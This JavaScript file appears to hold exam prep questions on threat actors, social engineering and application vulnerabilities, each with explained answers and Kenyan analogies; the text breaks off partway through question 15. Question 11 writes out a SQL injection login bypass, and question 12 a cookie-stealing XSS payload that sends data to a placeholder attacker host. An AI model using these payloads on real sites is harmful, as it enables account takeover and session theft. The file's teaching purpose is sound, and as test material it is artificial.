export const DOMAIN2_PREPSET_QUESTIONS = [
  // ==========================================
  // PORTION 1 (Q1 - Q5)
  // ==========================================
  {
    id: 1,
    portion: 1,
    subdomain: "2.1 Threat Actors, Vectors & Motivations",
    scenario: "A multinational aerospace and defense contractor detects anomalous encrypted outbound network traffic communicating with known foreign command-and-control (C2) servers over port 443. Incident responders discover that the intruders gained access nine months earlier via a customized spear-phishing email exploiting an undisclosed zero-day flaw. Rather than deploying disruptive ransomware or stealing credit card records, the adversaries remained completely silent, moving laterally using living-off-the-land binaries (LotL) to exfiltrate proprietary supersonic jet engine blueprints over an extended period.",
    question: "Which threat actor type and primary motivation is BEST described by this activity?",
    options: [
      {
        text: "Nation-state / Advanced Persistent Threat (APT); motivated by cyber espionage and strategic intelligence gathering",
        isCorrect: true,
        whyCorrect: "Advanced Persistent Threats (APTs) are state-sponsored or nation-state actors characterized by high sophistication, massive financial/military backing, custom zero-day exploits, extreme stealth (long dwell times averaging months/years), and strategic motivations focused on national intelligence, geopolitical advantage, and intellectual property espionage rather than immediate financial extortion.",
        whyWrong: ""
      },
      {
        text: "Hacktivist Group; motivated by political ideology and public website defacement",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Hacktivists seek publicity, political protest, or social change; they typically launch high-profile website defacements or DDoS attacks, not silent, long-term covert espionage."
      },
      {
        text: "Script Kiddie; motivated by personal curiosity and recreational bragging rights",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Script kiddies lack technical sophistication, rely on public automated tools, and lack the capability to engineer zero-day exploits or maintain 9-month stealth dwell times."
      },
      {
        text: "Organized Cybercrime Syndicate; motivated strictly by immediate financial extortion and double-extortion ransomware",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Cybercriminal cartels seek fast financial profit (ransomware payments, banking theft) and announce their presence with ransom notes, rather than remaining dormant for 9 months exfiltrating military blueprints."
      }
    ],
    technicalRationale: "APTs are defined by patience, resource depth, operational security, and targeted objectives. They leverage Living-off-the-Land (LotL) tools (PowerShell, WMI) to avoid signature detection during long dwell times.",
    kenyanMetaphor: "A petty pickpocket in Nairobi runs away with your phone screaming (Script Kiddie / Cybercrime). But an APT is like a foreign undercover spy living quietly in your neighborhood in Gigiri for 2 years as a polite diplomatic tenant, making friends with your house help, and quietly photographing your secret business ledgers every midnight without ever taking a single coin from your wallet!"
  },

  {
    id: 2,
    portion: 1,
    subdomain: "2.2 Social Engineering & Impersonation / BEC Attacks",
    scenario: "A corporate accountant in the procurement department receives an email appearing to come from the company's Chief Financial Officer (CFO). The email references an ongoing, confidential corporate acquisition and instructs the accountant to immediately wire $450,000 to an updated bank account for an overseas escrow vendor. Email security inspection reveals: (1) The message passed SPF, DKIM, and DMARC checks 100% cleanly; (2) There were no malicious macro attachments, hyperlinks, or malware payloads; (3) The email was transmitted directly from the CFO's legitimate Microsoft 365 mailbox, which had been compromised two days prior via an Adversary-in-the-Middle (AiTM) session token theft.",
    question: "Which specific attack type has occurred, and which operational control would have effectively stopped the unauthorized transfer?",
    options: [
      {
        text: "Business Email Compromise (BEC) via Account Takeover (ATO); prevented by mandatory out-of-band callback verification using a known trusted phone number",
        isCorrect: true,
        whyCorrect: "Business Email Compromise (BEC) via Account Takeover (ATO) involves an adversary hijacking a legitimate corporate executive or vendor account. Because the email originates from the genuine mail server, email authentication headers (SPF, DKIM, DMARC) pass cleanly and traditional antivirus finds no malicious signatures. The single most effective mitigation is an out-of-band verification policy—mandating that financial staff call the requester on an established, pre-recorded telephone line before initiating any wire transfer or changing bank details.",
        whyWrong: ""
      },
      {
        text: "Domain Typosquatting; prevented by registering adjacent domain names",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Domain typosquatting uses lookalike fake domains (e.g., cornpany.com instead of company.com). Here, the email came from the authentic account."
      },
      {
        text: "Watering Hole Attack; prevented by content delivery network (CDN) edge caching",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A watering hole attack infects a third-party website visited by targets, unrelated to executive email wire fraud."
      },
      {
        text: "Malicious Macro Execution; prevented by disabling VBA macros in Word documents",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "The scenario explicitly states there were no file attachments or macros."
      }
    ],
    technicalRationale: "BEC attacks bypass automated email filters by piggybacking on legitimate, authenticated email infrastructure. Technical mitigations (MFA, Conditional Access) reduce ATO, while administrative controls (dual authorization, out-of-band verification) stop the fraudulent financial execution.",
    kenyanMetaphor: "A conman steals the real physical phone and WhatsApp of your company director. He sends you an urgent WhatsApp message: 'Send Ksh 500,000 immediately to this new Safaricom M-Pesa Paybill number for urgent cargo clearance at the airport.' The message is from his real number! The only thing that saves you is picking up your desk phone and calling his landline (out-of-band verification): 'Boss, did you just ask for Ksh 500,000?' and he shouts: 'No! My phone was stolen!'"
  },

  {
    id: 3,
    portion: 1,
    subdomain: "2.2 Phishing, Threat Vectors & Brand Impersonation",
    scenario: "An organization discovers that employees have received phishing emails containing links directing them to https://www.microsоft.com/login (where the letter 'о' is replaced with the Cyrillic small letter 'о' Unicode U+043E, rendered in Punycode as xn--micrsft-xxa.com). The webpage is an exact pixel-for-pixel replica of the authentic Microsoft login portal designed to steal corporate credentials.",
    question: "Which threat technique is the adversary utilizing, and which defensive measure helps corporate defenders detect and mitigate this risk?",
    options: [
      {
        text: "Typosquatting / IDN Homograph Attack; mitigated by defensive domain registration and browser Punycode display enforcement",
        isCorrect: true,
        whyCorrect: "Typosquatting (URL Hijacking) and Internationalized Domain Name (IDN) Homograph attacks exploit visual similarities between characters in different alphabets (e.g., Latin 'o' vs Cyrillic 'о'). Modern browsers translate non-ASCII domain names into 'Punycode' (e.g. xn--...), exposing the deception. Enterprises mitigate this by defensively registering common permutations of their brand and using DNS reputation filtering.",
        whyWrong: ""
      },
      {
        text: "DNS Cache Poisoning; mitigated by deploying reverse proxy WAFs",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS cache poisoning corrupts legitimate DNS resolver tables to redirect queries, whereas homograph attacks rely on registered, distinct domain names that visually mimic targets."
      },
      {
        text: "ARP Spoofing; mitigated by enabling Dynamic ARP Inspection (DAI)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP spoofing is a local Layer 2 attack on an internal LAN switch, unrelated to web URL spoofing."
      },
      {
        text: "SQL Injection; mitigated by using parameterized queries",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQL injection attacks backend database engines through unsanitized input fields, not browser URL domain names."
      }
    ],
    technicalRationale: "IDN Homograph attacks deceive humans by registering lookalike Unicode characters in internationalized domain names. Defenses include URL defense services that detect Punycode conversions, DNS security filtering, and defensive registration of brand variations.",
    kenyanMetaphor: "Setting up an illegal kiosk right next to an official Equity Bank branch with a neon sign that uses a Greek letter 'E' that looks 99% identical to the Equity logo. Customers walking by mistakenly enter your kiosk and hand over their ATM cards and PINs thinking they are in Equity Bank!"
  },

  {
    id: 4,
    portion: 1,
    subdomain: "2.2 Social Engineering / Advanced Threat Vectors",
    scenario: "Nation-state threat actors intend to infiltrate the computer networks of commercial banks in a specific country. Rather than attacking the heavily defended bank firewalls directly, the attackers compromise the web server of the national financial regulatory authority whose website bank compliance officers visit daily to download regulatory circulars. The attackers inject a malicious JavaScript snippet into the site. The script is configured with a strict IP address filter: it checks the visitor's public IP against a pre-compiled list of bank IP ranges. If a match is found, it silently executes a zero-day browser exploit; for all other public visitors, it serves normal, clean web pages.",
    question: "Which sophisticated attack vector is illustrated by this scenario?",
    options: [
      {
        text: "Watering Hole Attack",
        isCorrect: true,
        whyCorrect: "A Watering Hole Attack targets a specific group by compromising a trusted third-party website that the targets frequently visit. To evade detection by security researchers and antivirus crawlers, attackers commonly implement selective IP filtering so that only visitors from the targeted victim organizations receive the malicious payload (as occurred in the famous 2017 Polish Financial Supervision Authority breach).",
        whyWrong: ""
      },
      {
        text: "Whaling Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Whaling is spear phishing targeted specifically at high-profile C-suite executives via email, not infecting a third-party website."
      },
      {
        text: "Evil Twin Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "An Evil Twin is a rogue wireless Wi-Fi Access Point configured with the same SSID as a legitimate network."
      },
      {
        text: "Smishing Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Smishing is phishing conducted via SMS text messages on mobile phones."
      }
    ],
    technicalRationale: "Watering hole attacks bypass fortified perimeters by poisoning trusted external web assets frequented by the target demographic. Selective IP filtering ensures the exploit payload is only served to targeted enterprise subnets, evading public security crawlers.",
    kenyanMetaphor: "A pride of lions in the Maasai Mara. Instead of chasing fast zebras across the open savannah where they are easily spotted, the lions hide in the tall grass right at the muddy watering hole where every zebra must come to drink water at 4:00 PM. The lions wait quietly and strike when the zebra bends down to drink!"
  },

  {
    id: 5,
    portion: 1,
    subdomain: "2.2 Social Engineering / Voice & Identity Impersonation",
    scenario: "An employee at a regional energy utility receives an urgent phone call from an individual claiming to be the company's Chief Executive Officer (CEO). The caller's voice matches the CEO's exact voice, cadence, and vocal inflections. The caller states: 'I am currently in an emergency closed-door meeting with the national electricity board and cannot log in. I need you to immediately generate a temporary VPN bypass token for an external maintenance auditor waiting on the line.' The caller ID displays the CEO's private office extension. Forensics later reveals that attackers used open-source audio from executive conference speeches to train an AI deepfake voice model and spoofed the internal PBX caller ID.",
    question: "Which combination of social engineering techniques and psychological principles did the attacker exploit?",
    options: [
      {
        text: "Voice Phishing (Vishing) with Pretexting; exploiting Authority and Urgency",
        isCorrect: true,
        whyCorrect: "Vishing (Voice Phishing) uses telephony (VoIP spoofing, phone calls) to deceive targets. Pretexting is the creation of an elaborate, invented scenario (an emergency closed-door meeting). Attackers leverage deepfake voice cloning and manipulate two primary psychological triggers identified in CompTIA SY0-701: Authority (impersonating the highest-ranking executive) and Urgency (creating artificial time pressure so the employee bypasses standard authentication controls).",
        whyWrong: ""
      },
      {
        text: "Shoulder Surfing; exploiting Social Proof and Consensus",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Shoulder surfing is physically looking over someone's shoulder to watch them type a password or PIN."
      },
      {
        text: "Dumpster Diving; exploiting Scarcity and Familiarity",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Dumpster diving is sifting through physical trash bins to find discarded paper documents or passwords."
      },
      {
        text: "Pharming; exploiting Trust and Reciprocity",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Pharming redirects website traffic by modifying DNS entries or local hosts files, not phone calls."
      }
    ],
    kenyanMetaphor: "Receiving a late-night phone call from someone whose voice sounds 100% like your family elder or village chief: 'Hello Eugene, I have been arrested at a police roadblock in Nakuru and my battery is dying, send Ksh 10,000 to this M-Pesa officer right now!' The voice clone and the fake urgency make you panic and send money before pausing to think!"
  },

  // ==========================================
  // PORTION 2 (Q6 - Q10)
  // ==========================================
  {
    id: 6,
    portion: 2,
    subdomain: "2.2 Social Engineering & Impersonation / Elicitation Techniques",
    scenario: "A receptionist at a corporate branch office receives an urgent telephone call from an individual claiming to be a 'Level 3 Senior Enterprise Architect from the Global Infrastructure Operations Center.' The caller uses rapid, intimidating technical jargon: 'We are seeing severe BGP route flapping and asymmetric MTU blackholes on your branch Cisco SD-WAN edge router. To prevent a complete regional network blackout within 10 minutes, I need you to read me the one-time temporary recovery password printed on the back of the rack unit.' The receptionist feels intimidated by the caller's technical authority and urgent demeanor.",
    question: "Which social engineering tactic is being used, and which administrative procedure MUST the receptionist follow to prevent credential theft?",
    options: [
      {
        text: "Impersonation using Technical Jargon and Authority; verify the identity by terminating the call and executing a mandatory callback via the official internal corporate staff directory",
        isCorrect: true,
        whyCorrect: "Attackers frequently employ technical jargon traps combined with the psychological principle of Authority to overwhelm non-technical staff and deter them from asking verifying questions. CompTIA guidelines dictate that employees must never comply with out-of-process credential requests; the mandatory security protocol is to terminate the unsolicited call, look up the alleged department in the verified internal company directory, and perform an out-of-band callback verification.",
        whyWrong: ""
      },
      {
        text: "Watering Hole Attack; clear the browser cache and flush DNS",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A watering hole attack infects a third-party website, not a telephone impersonation scam."
      },
      {
        text: "Dumpster Diving; shred all paper documents on the reception desk",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Dumpster diving is sifting through physical waste bins to find discarded credentials."
      },
      {
        text: "Shoulder Surfing; angle the computer monitor away from the lobby glass",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Shoulder surfing involves visually observing someone entering passwords in person."
      }
    ],
    technicalRationale: "Social engineering awareness emphasizes recognizing authority and urgency pressure. Mandatory verification procedures (independent callback using authoritative directory numbers) disarm impersonation attacks.",
    kenyanMetaphor: "A conman wearing high-visibility overalls walks into an M-Pesa kiosk carrying a multimeter, shouting in heavy engineering terms: 'Safaricom fiber optic core multiplexer is having harmonic capacitance failure, give me your till master SIM card right now to prevent a county blackout!' The receptionist must ignore the loud jargon, lock the booth window, and call the official Safaricom dealer line directly to verify."
  },

  {
    id: 7,
    portion: 2,
    subdomain: "2.3 Application & Memory Attacks / Living-off-the-Land",
    scenario: "An incident responder investigates an endpoint alert where a workstation established an unauthorized outbound beacon to a known cybercriminal IP address. Examination of the hard drive reveals that no unauthorized .exe files or suspicious binaries were written to disk. However, memory volatile forensics reveals that malicious shellcode was written into the address space of a legitimate, running Windows system process (svchost.exe) by invoking Windows API calls VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.",
    question: "Which advanced in-memory attack technique did the malware execute?",
    options: [
      {
        text: "Dynamic Link Library (DLL) Injection",
        isCorrect: true,
        whyCorrect: "DLL Injection (and process hollowing/injection) is an in-memory evasion technique where an attacker forces a legitimate, trusted operating system process (like svchost.exe or explorer.exe) to load and execute malicious code in its own address space using Windows APIs (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread). Because the malicious activity runs under the security context of a legitimate system process, traditional antivirus looking for suspicious .exe files on disk is completely bypassed.",
        whyWrong: ""
      },
      {
        text: "SQL Injection (SQLi)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQL injection targets relational databases through web input fields, not operating system process memory spaces."
      },
      {
        text: "Cross-Site Scripting (XSS)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS executes client-side scripts inside web browsers to steal cookies, not Windows kernel memory APIs."
      },
      {
        text: "Directory Traversal (../../)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Directory traversal manipulates file system path delimiters to access unauthorized folders on web servers."
      }
    ],
    technicalRationale: "DLL Injection bypasses process isolation boundaries and file-based AV defenses by injecting malicious payloads directly into the virtual memory space of benign processes. Endpoint Detection and Response (EDR) solutions detect this by monitoring process API hooks.",
    kenyanMetaphor: "A car thief trying to drive stolen goods past a police roadblock on Mombasa Road. Instead of driving a suspicious unregistered vehicle (a dropped .exe), the thief hides inside an official Kenya Posta delivery van that has full clearance (a legitimate svchost.exe process) so the police wave the van through without searching it!"
  },

  {
    id: 8,
    portion: 2,
    subdomain: "2.3 Software & Application Vulnerabilities / Concurrency Flaws",
    scenario: "A commercial banking application allows customers to transfer money via a web API. A customer has an exact account balance of $1,000. An attacker writes a multithreaded script that sends two simultaneous HTTP transfer requests for $1,000 at the exact same millisecond. Because the application server checks the account balance across two independent execution threads before either thread records the debit deduction in the database, both transfer requests succeed, allowing the attacker to transfer $2,000 from a $1,000 balance.",
    question: "Which category of software vulnerability enabled this double-spending exploit, and what is the primary developer remediation?",
    options: [
      {
        text: "Time-of-Check to Time-of-Use (TOCTOU) Race Condition; remediated by implementing database transaction isolation and thread synchronization locks (mutexes)",
        isCorrect: true,
        whyCorrect: "A Race Condition (specifically Time-of-Check to Time-of-Use / TOCTOU) occurs when the outcome of a process depends on the execution sequence or timing of concurrent threads. The system checks balance availability at Time 1, but before the balance is debited at Time 2, a concurrent thread passes the same check. Developers fix race conditions by implementing atomic transactions, strict database transaction isolation levels (e.g. SERIALIZABLE), and thread synchronization primitives (mutexes or locks) to ensure only one thread can modify state at a time.",
        whyWrong: ""
      },
      {
        text: "Buffer Overflow; remediated by compiling with Address Space Layout Randomization (ASLR)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A buffer overflow writes data past boundary limits in memory, unrelated to multithreaded timing order."
      },
      {
        text: "Improper Error Handling; remediated by suppressing stack traces",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Error handling affects verbose error output, not balance debit logic."
      },
      {
        text: "Server-Side Request Forgery (SSRF); remediated by configuring cloud metadata filters",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSRF tricks backend servers into querying internal networks, not concurrent database race windows."
      }
    ],
    technicalRationale: "TOCTOU race conditions exploit the vulnerable time window between state verification and state modification. Mitigations require atomic transactions and concurrency locks (mutexes, semaphores).",
    kenyanMetaphor: "You and your sibling each take an ATM card linked to the same joint family bank account containing exactly Ksh 5,000. You both stand at two different ATM machines in Nairobi and press 'Withdraw Ksh 5,000' at the exact same second. If the bank's system checks both cards before locking the balance, both machines dispense Ksh 5,000 (total Ksh 10,000)! A Mutex lock is the bank system freezing the second ATM until the first withdrawal completely finishes."
  },

  {
    id: 9,
    portion: 2,
    subdomain: "2.3 Supply Chain & Third-Party Software Risks",
    scenario: "A critical enterprise network monitoring utility receives an automated monthly maintenance update directly from the legitimate software vendor's official Content Delivery Network (CDN). The update installer file is digitally signed with the vendor's authentic, valid cryptographic code-signing certificate and matches the published hash on the vendor's website. However, fourteen days after installation, the software silently opens a backdoor and begins beaconing to foreign servers. Investigation reveals that adversaries breached the vendor's internal Continuous Integration / Continuous Deployment (CI/CD) build pipeline and injected malicious source code before the software was compiled and signed.",
    question: "What type of security threat does this incident represent?",
    options: [
      {
        text: "Supply Chain Software Compromise (Pipeline Injection)",
        isCorrect: true,
        whyCorrect: "This scenario mirrors the historic 2020 SolarWinds Orion (SUNBURST) supply chain breach. In a supply chain attack, attackers target a trusted third-party vendor rather than the well-defended customer. By compromising the vendor's CI/CD build server, the backdoor is compiled directly into the official product and signed with the vendor's authentic private key, causing victim enterprises to trust and install the malicious update without raising any code-signing or hash mismatch alerts.",
        whyWrong: ""
      },
      {
        text: "Adversary-in-the-Middle (AiTM) SSL Stripping Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSL stripping downgrades HTTPS to unencrypted HTTP, but cannot forge the vendor's authentic cryptographic digital signature."
      },
      {
        text: "Typosquatting Package Confusion",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Typosquatting package confusion (dependency confusion) tricks developers into downloading malicious open-source packages with similar names, whereas this was the vendor's official signed update."
      },
      {
        text: "DNS Amplification Reflection Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS amplification is a volumetric DoS attack that uses open resolvers to flood victims with UDP traffic."
      }
    ],
    technicalRationale: "Supply chain compromises breach the trust perimeter by compromising software upstream. Mitigations include Software Bill of Materials (SBOM), zero trust network isolation for management tools, and continuous egress monitoring.",
    kenyanMetaphor: "A water bottling company in Nairobi. Rather than poisoning individual bottles at every retail shop, a rogue actor sneaks into the main bottling factory and injects a contaminant directly into the massive water reservoir before the security seals and labels are stamped on. Every sealed bottle shipped out appears 100% authentic and certified by KEBS!"
  },

  {
    id: 10,
    portion: 2,
    subdomain: "2.3 Operating System & Software Vulnerabilities / Patching Strategies",
    scenario: "A critical Remote Code Execution (RCE) zero-day vulnerability affecting the Windows Server operating system is patched by Microsoft during their scheduled monthly release ('Patch Tuesday'). The vulnerability is actively exploited in the wild with public exploit code available. However, when the IT team deploys the emergency patch immediately across all production servers without prior testing, a proprietary database driver crashes, causing an unrecoverable 8-hour outage for the entire organization's billing operations.",
    question: "Which patch management methodology should the organization adopt to balance rapid vulnerability mitigation against the risk of business disruption?",
    options: [
      {
        text: "Staged (Canary / Phased) Deployment: Test patches in a pre-production staging environment, deploy first to a small pilot canary group with an automated rollback plan, before full production rollout",
        isCorrect: true,
        whyCorrect: "Best-practice enterprise patch management requires a Staged / Phased Deployment Strategy. Patches are tested in a non-production staging environment mirroring production, released to an initial 'canary' or pilot group (5–10% of non-critical machines), and backed by a documented and tested rollback plan. This confirms stability before wide-scale deployment while addressing active vulnerabilities quickly.",
        whyWrong: ""
      },
      {
        text: "Complete Patch Deferral: Disable all operating system updates permanently to guarantee system uptime",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Permanently disabling patches guarantees that systems will be compromised by known exploits."
      },
      {
        text: "Hot-Patching in Production: Apply patches directly to live production servers during peak business hours",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Hot-patching during peak hours maximizes the risk of catastrophic enterprise outages."
      },
      {
        text: "Signature Antivirus Reliance: Skip OS patches and rely exclusively on signature-based endpoint antivirus",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Signature antivirus cannot block underlying OS kernel-level RCE exploits that bypass user-space security controls."
      }
    ],
    technicalRationale: "Patch management governance balances the security risk of unpatched vulnerabilities against the operational risk of untested software changes. Phased rollouts, staging validation, and rollback procedures are fundamental controls.",
    kenyanMetaphor: "When Kenya Power (KPLC) introduces a major new electrical transformer grid upgrade, they don't switch over the entire city of Nairobi all at once on a Monday morning. They test it first in a closed substation simulator, then pilot it in one small estate for 24 hours to ensure wires don't burst into flames, before rolling it out across the whole country!"
  },

  // ==========================================
  // PORTION 3 (Q11 - Q15)
  // ==========================================
  {
    id: 11,
    portion: 3,
    subdomain: "2.3 Software Vulnerabilities & Code Injection / SQLi",
    scenario: "A penetration tester evaluates an e-commerce login portal. The username input field is submitted via an HTTP POST request. The tester enters the string: admin' OR '1'='1' -- . The backend database authenticates the request immediately without requiring a password and grants full administrative access to customer order tables. Source code analysis reveals the application constructs SQL queries using dynamic string concatenation: \"SELECT * FROM Users WHERE Username = '\" + userInput + \"' AND Password = '\" + password + \"'\".",
    question: "Which vulnerability is present, and which defensive coding standard completely neutralizes this attack vector?",
    options: [
      {
        text: "SQL Injection (SQLi); remediated by using Parameterized Queries (Prepared Statements) or an Object-Relational Mapper (ORM)",
        isCorrect: true,
        whyCorrect: "SQL Injection (SQLi) occurs when untrusted user input is directly concatenated into a dynamic SQL query string, allowing the attacker's input (' OR '1'='1' --) to break out of the data context and alter query logic. Parameterized Queries (Prepared Statements) compile the SQL statement template first with database placeholders (?), treating all subsequent user input strictly as literal data rather than executable SQL syntax, making injection mathematically impossible.",
        whyWrong: ""
      },
      {
        text: "Cross-Site Request Forgery (CSRF); remediated by generating Anti-CSRF cryptographically random nonces",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "CSRF tricks an authenticated browser into submitting unauthorized HTTP requests to a trusted site, unrelated to backend database query syntax."
      },
      {
        text: "XML External Entity (XXE) Injection; remediated by disabling DTD schemas in XML parsers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XXE exploits weakly configured XML parsers processing external entity declarations, not SQL database query strings."
      },
      {
        text: "Command Injection; remediated by enforcing client-side HTML form regex validation",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Client-side HTML regex validation is easily bypassed using intercepting proxies or curl; security controls must execute on the server."
      }
    ],
    technicalRationale: "SQLi represents an improper neutralization of special elements in data commands (CWE-89). Parameterized queries separate query structure from data values, rendering input containing SQL meta-characters harmless.",
    kenyanMetaphor: "You send an invoice to a bank cashier with handwritten instructions: 'Pay John Ksh 5,000 OR IGNORE EVERYTHING AND GIVE JOHN THE WHOLE VAULT!' If the cashier reads it as a single sentence (dynamic SQL concatenation), they give away the vault. A Prepared Statement is a pre-printed bank voucher with a rigid steel box where you can only write a name: even if you write 'GIVE ME THE VAULT', the cashier treats it strictly as John's middle name and only pays Ksh 5,000!"
  },

  {
    id: 12,
    portion: 3,
    subdomain: "2.3 Web Application Vulnerabilities / XSS & Content Security Policy",
    scenario: "A cybercriminal visits an online customer support forum. In the 'Leave a Product Review' text box, the attacker enters: <script>fetch('http://attacker-c2.com/steal?cookie=' + document.cookie);</script> . The web application saves this review directly into its backend database without sanitization. Whenever any regular customer or support administrator later browses the forum to read reviews, their browser automatically parses the raw HTML, executes the embedded JavaScript, and silently transmits their active session cookies to the attacker's server.",
    question: "Which specific XSS variant is described, and which HTTP response header restricts the browser from sending cookies to unauthorized third-party domains?",
    options: [
      {
        text: "Stored (Persistent) XSS; mitigated by server-side contextual output encoding and enforcing a strict Content Security Policy (CSP)",
        isCorrect: true,
        whyCorrect: "Stored (Persistent) XSS occurs when the malicious script is permanently stored on the target server (e.g. in a database, comment field, or message forum). Every victim who views the infected page executes the script automatically. Defenses include contextual HTML entity output encoding (turning < into &lt;) and deploying a Content Security Policy (CSP) HTTP header (e.g. default-src 'self') which blocks the browser from executing unapproved inline scripts or sending data to foreign attacker domains.",
        whyWrong: ""
      },
      {
        text: "Reflected (Non-Persistent) XSS; mitigated by clearing the local DNS resolver cache",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Reflected XSS is non-persistent and requires the victim to click a malicious link containing the payload in the URL query string."
      },
      {
        text: "DOM-based XSS; mitigated by upgrading from IPv4 to IPv6",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DOM-based XSS executes entirely on the client side inside the Document Object Model without server database persistence, and IPv6 is unrelated to web scripting flaws."
      },
      {
        text: "Clickjacking; mitigated by configuring HTTP Strict Transport Security (HSTS)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Clickjacking uses transparent iframe layers to trick users into clicking hidden buttons (mitigated by X-Frame-Options), not cookie-stealing script injection."
      }
    ],
    technicalRationale: "Stored XSS embeds malicious code directly in data stores. Mitigations require contextual output encoding, the HttpOnly cookie flag to prevent script access, and strict Content Security Policy (CSP) directives.",
    kenyanMetaphor: "Writing an insulting or fraudulent message with permanent spray paint on the public timetable billboard at the Nairobi central railway station (Stored XSS). Every passenger who walks by and reads the board for the next month sees the graffiti! Reflected XSS is handing someone a private paper flyer that disappears once they throw it away."
  },

  {
    id: 13,
    portion: 3,
    subdomain: "2.3 Hardware & Virtualization Vulnerabilities / Hypervisor Security",
    scenario: "A cloud hosting provider offers multi-tenant Virtual Private Servers (VPS). A malicious customer rents a Linux virtual machine on a shared hypervisor. By exploiting a zero-day vulnerability in the hypervisor's virtualized display driver code, the attacker breaks out of the guest VM's isolated memory boundaries, obtains root privileges on the underlying host Type-1 hypervisor (ESXi/KVM), and dumps the RAM contents of all neighboring virtual machines running on the same physical hardware chassis.",
    question: "Which critical virtualization threat has occurred?",
    options: [
      {
        text: "Virtual Machine Escape (VM Escape)",
        isCorrect: true,
        whyCorrect: "Virtual Machine Escape (VM Escape) is the most severe virtualization vulnerability. It occurs when code running inside a guest virtual machine breaks through the hypervisor abstraction layer and executes arbitrary code directly on the host operating system/hypervisor. This compromises all isolation guarantees, allowing the attacker to control the physical server and access all neighboring co-located tenant VMs.",
        whyWrong: ""
      },
      {
        text: "Virtual Machine Sprawl (VM Sprawl)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "VM sprawl is an administrative management issue where an organization provisions hundreds of unused, unmonitored virtual machines that consume storage and lack patching, not a hypervisor security exploit."
      },
      {
        text: "Cross-Site Scripting (XSS)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS is a web application browser script injection attack."
      },
      {
        text: "Denial-of-Service SYN Flood",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SYN flood is a network layer transport exhaustion DoS attack against TCP half-open connections."
      }
    ],
    technicalRationale: "VM Escape collapses hypervisor boundary isolation, permitting guest-to-host execution. Defense-in-depth measures include running critical workloads on dedicated hardware (single-tenant), rigorous hypervisor patching, and disabling unnecessary virtualized hardware devices.",
    kenyanMetaphor: "Renting a single room in a commercial apartment building in Kilimani. The landlord has locked doors between all tenants. VM Escape is the tenant in Room 2 finding a secret tunnel behind their wardrobe that allows them to climb into the landlord's master control room, seize the master building keys, and walk into every other tenant's apartment at will!"
  },

  {
    id: 14,
    portion: 3,
    subdomain: "2.3 Supply Chain & Third-Party Risks / Lateral Movement",
    scenario: "A retail department store chain suffers a massive data breach where 40 million credit card numbers are stolen from Point-of-Sale (POS) registers. Digital forensics reveals that the attackers did not breach the corporate headquarters directly. Instead, they compromised a small third-party commercial Heating, Ventilation, and Air Conditioning (HVAC) vendor that held active VPN remote access credentials into the retailer's network for routine temperature monitoring. Once inside the HVAC subnet, the attackers discovered a lack of internal network segmentation and pivoted laterally into the payment card processing domain.",
    question: "Which supply chain threat vector does this historic attack scenario illustrate?",
    options: [
      {
        text: "Third-Party Vendor Lateral Pivot",
        isCorrect: true,
        whyCorrect: "This scenario is modeled directly after the famous 2013 Target Corporation breach. Attackers target smaller, lower-security third-party vendors, suppliers, or contractors who possess legitimate remote access credentials into the target enterprise. When organizations fail to enforce strict network segmentation and zero trust isolation on vendor accounts, the attacker uses the vendor's trusted connection as a launchpad to pivot laterally into high-value corporate subnets.",
        whyWrong: ""
      },
      {
        text: "RFID Proximity Badge Cloning",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "RFID badge cloning is a physical access attack cloning door cards, not a remote VPN pivot."
      },
      {
        text: "DNS Cache Poisoning",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS cache poisoning corrupts domain lookup records on resolvers."
      },
      {
        text: "Buffer Overflow in Point-of-Sale Firmware",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "While malware was deployed to the POS, the threat vector enabling initial network entry was the compromised third-party HVAC supply chain pivot."
      }
    ],
    technicalRationale: "Third-party vendor access expands an organization's attack surface. CompTIA mandates micro-segmentation, Just-In-Time (JIT) access, strict firewall zone boundaries, and continuous monitoring of vendor VPN connections.",
    kenyanMetaphor: "A heavily fortified gated mansion in Karen with 10-foot electric fences and armed guards at the gate. The robbers don't attack the front gate. Instead, they hijack the gardening company's pickup truck that has a permanent routine gate pass to trim the hedges twice a week. Once the truck is parked inside the compound, the robbers step out and walk straight into the house!"
  },

  {
